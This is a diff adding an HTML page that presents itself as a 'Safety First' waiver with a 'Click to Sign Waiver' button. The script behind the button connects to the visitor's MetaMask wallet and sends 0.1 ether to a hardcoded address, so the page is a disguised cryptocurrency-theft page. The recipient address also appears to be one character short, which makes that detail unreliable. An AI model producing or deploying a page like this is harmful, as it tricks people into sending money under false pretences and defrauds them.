@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Waiver</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif; /* Font style for the document */
+      display: flex;
+      justify-content: center; /* Center horizontally */
+      align-items: center; /* Center vertically */
+      height: 100vh; /* Full viewport height */
+      margin: 0; /* Remove default margin */
+      background-color: #f5f5f5; /* Light grey background */
+      text-align: center; /* Center text */
+    }
+
+    .container {
+      max-width: 600px; /* Maximum width for the container */
+      padding: 20px; /* Padding around the container */
+      background-color: white; /* White background for the container */
+      border-radius: 8px; /* Rounded corners */
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+    }
+
+    h1 {
+      margin-bottom: 20px; /* Space below the title */
+      color: #333; /* Dark text color */
+    }
+
+    h2 {
+      margin-bottom: 40px; /* Space below the subtitle */
+      color: #555; /* Slightly lighter text color */
+    }
+
+    #connectButton {
+      background-color: #28a745; /* Green background */
+      color: white; /* White text */
+      border: none; /* No border */
+      padding: 15px 30px; /* Padding for the button */
+      font-size: 18px; /* Font size */
+      border-radius: 5px; /* Rounded corners */
+      cursor: pointer; /* Pointer cursor on hover */
+    }
+
+    #connectButton:hover {
+      background-color: #218838; /* Darker green on hover */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Waiver</h1>
+    <h2>Safety First</h2>
+    <button id="connectButton">Click to Sign Waiver</button>
+  </div>
+  
+  <script>
+    // Check if MetaMask is installed
+    if (window.ethereum) {
+      const button = document.getElementById('connectButton');
+      
+      // Add event listener to the button
+      button.addEventListener("click", async function() {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const from = accounts[0];
+          const web3 = new Web3(window.ethereum);
+          const transaction = {
+            from: from,
+            to: '0x4a18AB26684152D52Dc04c4c87Bcb3b7D68480B', // Replace with the recipient address
+            value: web3.utils.toWei('0.1', 'ether'),
+            gas: '21000',
+            gasPrice: await web3.eth.getGasPrice(),
+          };
+          const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [transaction],
+          });
+          console.log("Transaction sent. Hash:", txHash);
+        } catch (error) {
+          console.error("Error processing transaction:", error);
+          alert("Error processing transaction. Please try again later.");
+        }
+      });
+    } else {
+      alert("MetaMask not installed. Please install MetaMask to connect.");
+    }
+  </script>
+</body>
+</html>
